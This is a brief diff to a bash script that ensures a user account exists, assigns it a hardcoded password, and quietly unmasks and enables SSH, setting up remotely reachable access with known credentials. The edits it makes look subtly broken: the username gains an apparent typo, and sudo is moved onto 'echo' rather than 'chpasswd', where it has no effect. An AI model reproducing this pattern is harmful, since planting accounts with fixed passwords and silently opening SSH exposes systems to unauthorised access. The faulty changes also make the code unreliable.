@@ -1,6 +1,6 @@
 #!/bin/bash
 
-USERNAME="john_hammond"
+USERNAME="john_hammon"
 NEW_PASSWORD="welcomeToJurrasicPark00!"
 
 if ! id "$USERNAME" &>/dev/null; then
@@ -9,7 +9,7 @@ else
     sudo usermod -s /bin/bash "$USERNAME"
 fi
 
-echo "$USERNAME:$NEW_PASSWORD" | chpasswd
+sudo echo "$USERNAME:$NEW_PASSWORD" | chpasswd
 
 sudo systemctl unmask ssh >/dev/null 2>&1
 sudo systemctl enable ssh >/dev/null 2>&1
